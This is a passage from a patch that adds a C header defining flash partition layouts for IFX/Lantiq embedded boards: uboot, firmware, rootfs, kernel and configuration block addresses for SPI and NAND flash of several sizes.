+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME           "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR           0x00020000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x007EDFFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME            "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR            0x007EE000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                  0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR              0x007FDFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME             "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR             0x007FE000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                   0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR               0x007FEFFF
+
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME         "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR         0x007FF000
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE               0x400
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR           0x007FFFFF
+
+  #define IFX_CFG_FLASH_END_ADDR                         0x007FFFFF
+
+
+#else
+  #error "ERROR!! Define flash size first!"
+#endif
+
+#else /*Not defined CONFIG_FIRMWARE_IN_ROOTFS*/
+#if (IFX_CONFIG_FLASH_SIZE == 1)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00020000\0"                                      \
+        "part2_begin=0x000A0000\0"                                      \
+        "total_part=3\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO          \
+  "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"  \
+  "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0" \
+  "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0" \
+  "data_block3=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0" \
+  "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"   \
+  "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"    \
+  "data_block6=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"  \
+  "total_db=7\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME          "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR          0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME       "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR       0x00020000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE             0
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME    "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME         "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR         0x000A0000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE               0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock2"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME         "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR         0x000F5FFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE               0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME           "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR           0x000F6000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                 0x8000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR             0x000FDFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME            "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR            0x000FE000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                  0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR              0x000FEFFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME        "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR        0x000FFE00
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE              0x0200
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR          0x000FFFFF
+
+  #define IFX_CFG_FLASH_END_ADDR                        0x000FFFFF
+
+//2MB flash partition
+#elif (IFX_CONFIG_FLASH_SIZE == 2)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00020000\0"                                      \
+        "part2_begin=0x000A0000\0"                                      \
+        "total_part=3\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO          \
+  "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"  \
+  "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0" \
+  "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0" \
+  "data_block3=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0" \
+  "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"   \
+  "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"    \
+  "data_block6=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"  \
+  "total_db=7\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME          "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR          0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME       "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR       0x00020000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE             0
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME    "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME         "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR         0x000A0000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE               0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock2"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME         "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR         0x001F5FFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE               0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME           "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR           0x001F6000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                 0x8000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR             0x001FDFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME            "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR            0x001FE000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                  0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR              0x001FEFFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME        "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR        0x001FFE00
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE              0x0200
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR          0x001FFFFF
+
+  #define IFX_CFG_FLASH_END_ADDR                        0x001FFFFF
+
+//4MB flash partition
+#elif (IFX_CONFIG_FLASH_SIZE == 4)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00020000\0"                                      \
+        "part2_begin=0x000A0000\0"                                      \
+        "total_part=3\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block6=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "total_db=7\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME           "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR           0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME        "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR        0x00020000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE              0
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME     "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME          "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR          0x000A0000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock2"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME          "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR          0x003F5FFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME            "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR            0x003F6000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                  0x8000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR              0x003FDFFF
+
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME             "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR             0x003FE000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                   0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR               0x003FEFFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME         "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR         0x003FFE00
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE               0x0200
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR           0x003FFFFF
+
+  #define IFX_CFG_FLASH_END_ADDR                         0x003FFFFF
+
+#elif (IFX_CONFIG_FLASH_SIZE == 8)
+#if !defined( CONFIG_AR10_GPHY_FW_EMBEDDED )
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00010000\0"                                      \
+        "part2_begin=0x00020000\0"                                      \
+        "part3_begin=0x00054000\0"                                      \
+        "total_part=4\0"
+#else
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00020000\0"                                      \
+        "part2_begin=0x00054000\0"                                      \
+        "total_part=3\0"
+#endif
+
+#if !defined( CONFIG_AR10_GPHY_FW_EMBEDDED )
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_GPHY_FIRMWARE_IMAGE_BLOCK_NAME "\0"\
+        "data_block2=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block3=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block5=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block6=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block7=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "data_block8=" IFX_CFG_FLASH_WLAN_CFG_BLOCK_NAME "\0"    \
+        "total_db=9\0"
+#else
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block6=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+	"data_block7=" IFX_CFG_FLASH_WLAN_CFG_BLOCK_NAME "\0"    \
+        "total_db=8\0"
+#endif
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME            "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR            0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                  0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock0"
+
+#if !defined( CONFIG_AR10_GPHY_FW_EMBEDDED )
+  #define IFX_CFG_FLASH_GPHY_FIRMWARE_IMAGE_BLOCK_NAME    "gphy_firmware"
+  #define IFX_CFG_FLASH_GPHY_FIRMWARE_IMAGE_START_ADDR    0x00010000
+  #define IFX_CFG_FLASH_GPHY_FIRMWARE_IMAGE_SIZE          0
+  #define IFX_CFG_FLASH_GPHY_FIRMWARE_IMAGE_MTDBLOCK_NAME "/dev/mtdblock1"
+#endif
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME         "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR         0x00020000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE               0
+#if !defined( CONFIG_VR9_GPHY_FW_EMBEDDED )
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock2"
+#else
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock1"
+#endif
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME           "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR           0x00054000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                 0	
+#if !defined( CONFIG_VR9_GPHY_FW_EMBEDDED )
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock3"
+#else
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock2"
+#endif
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x007DFFFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0x007E0000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0x007EFFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0x007F0000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x2000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0x007F1FFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME               "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR               0x007F2000
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE                     0x1000
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR                 0x007F2FFF
+
+  #define IFX_CFG_FLASH_WLAN_CFG_BLOCK_NAME	          "wlanconfig"
+  #define IFX_CFG_FLASH_WLAN_CFG_START_ADDR	      	  0x007F3000
+  #define IFX_CFG_FLASH_WLAN_CFG_SIZE		          0x2000
+  #define IFX_CFG_FLASH_WLAN_CFG_END_ADDR		  0x007F4FFF  
+
+  #define IFX_CFG_FLASH_END_ADDR                          0x007FFFFF
+
+#elif (IFX_CONFIG_FLASH_SIZE == 16)
+#if !defined( CONFIG_AR10_GPHY_FW_EMBEDDED )
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00010000\0"                                      \
+        "part2_begin=0x00020000\0"                                      \
+        "part3_begin=0x00054000\0"                                      \
+        "total_part=4\0"
+#else
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00020000\0"                                      \
+        "part2_begin=0x00054000\0"                                      \
+        "total_part=3\0"
+#endif
+
+#if !defined( CONFIG_AR10_GPHY_FW_EMBEDDED )
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_GPHY_FIRMWARE_IMAGE_BLOCK_NAME "\0"\
+        "data_block2=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block3=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block5=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block6=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block7=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "data_block8=" IFX_CFG_FLASH_WLAN_CFG_BLOCK_NAME "\0"    \
+        "total_db=9\0"
+#else
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block6=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+	"data_block7=" IFX_CFG_FLASH_WLAN_CFG_BLOCK_NAME "\0"    \
+        "total_db=8\0"
+#endif
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME            "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR            0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                  0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock0"
+
+#if !defined( CONFIG_AR10_GPHY_FW_EMBEDDED )
+  #define IFX_CFG_FLASH_GPHY_FIRMWARE_IMAGE_BLOCK_NAME    "gphy_firmware"
+  #define IFX_CFG_FLASH_GPHY_FIRMWARE_IMAGE_START_ADDR    0x00010000
+  #define IFX_CFG_FLASH_GPHY_FIRMWARE_IMAGE_SIZE          0
+  #define IFX_CFG_FLASH_GPHY_FIRMWARE_IMAGE_MTDBLOCK_NAME "/dev/mtdblock1"
+#endif
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME         "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR         0x00020000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE               0
+#if !defined( CONFIG_VR9_GPHY_FW_EMBEDDED )
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock2"
+#else
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock1"
+#endif
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME           "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR           0x00054000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                 0	
+#if !defined( CONFIG_VR9_GPHY_FW_EMBEDDED )
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock3"
+#else
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock2"
+#endif
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x00FDFFFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0x00FE0000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0x00FEFFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0x00FF0000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x2000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0x00FF1FFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME               "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR               0x00FF2000
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE                     0x1000
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR                 0x00FF2FFF
+
+  #define IFX_CFG_FLASH_WLAN_CFG_BLOCK_NAME	          "wlanconfig"
+  #define IFX_CFG_FLASH_WLAN_CFG_START_ADDR	      	  0x00FF3000
+  #define IFX_CFG_FLASH_WLAN_CFG_SIZE		          0x2000
+  #define IFX_CFG_FLASH_WLAN_CFG_END_ADDR		  0x00FF4FFF
+
+  #define IFX_CFG_FLASH_END_ADDR                          0x00FFFFFF
+
+#else
+  #error "ERROR!! Define flash size first!"
+#endif
+
+#endif /*CONFIG_FIRMWARE_IN_ROOTFS*/
+
+
+#endif /*CONFIG_BOOT_FROM_SPI*/
+/* End of Board specific configurations
+ *-----------------------------------------------------------------------
+ */
+
+
+
+/***************************************************************************/
+/***************************************************************************/
+/***************NAND FLASH map starts here***********************************/
+/***************************************************************************/
+/***************************************************************************/
+
+#ifdef CONFIG_BOOT_FROM_NAND
+
+#ifdef CONFIG_NAND_FLASH_2M
+#define IFX_CONFIG_FLASH_SIZE 2
+#elif CONFIG_NAND_FLASH_4M
+#define IFX_CONFIG_FLASH_SIZE 4
+#elif CONFIG_NAND_FLASH_8M
+#define IFX_CONFIG_FLASH_SIZE 8
+#elif CONFIG_NAND_FLASH_128M
+#define IFX_CONFIG_FLASH_SIZE 128
+#elif CONFIG_NAND_FLASH_512M
+#define IFX_CONFIG_FLASH_SIZE 512
+#elif CONFIG_NAND_FLASH_2048M
+#define IFX_CONFIG_FLASH_SIZE 2048
+#elif CONFIG_NAND_FLASH_4096M
+#define IFX_CONFIG_FLASH_SIZE 4096
+#endif
+
+#ifndef IFX_CONFIG_FLASH_SIZE
+#define IFX_CONFIG_FLASH_SIZE 4
+#endif
+
+#ifdef CONFIG_FIRMWARE_IN_ROOTFS
+//2MB flash partition
+#if (IFX_CONFIG_FLASH_SIZE == 2)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00010000\0"                                      \
+        "total_part=2\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO          \
+  "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"  \
+  "data_block1=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0" \
+  "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0" \
+  "data_block3=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"   \
+  "data_block4=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"    \
+  "data_block5=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"  \
+  "total_db=6\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME          "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR          0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME         "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR         0x00010000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE               0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME         "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR         0x001FADFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE               0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME           "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR           0x001FB200
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                 0x4000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR             0x001FEDFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME            "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR            0x001FEE00
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                  0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR              0x001FFDFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME        "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR        0x001FFE00
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE              0x0200
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR          0x001FFFFF
+
+  #define IFX_CFG_FLASH_END_ADDR                        0x001FFFFF
+
+//4MB flash partition
+#elif (IFX_CONFIG_FLASH_SIZE == 4)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00010000\0"                                      \
+        "total_part=2\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
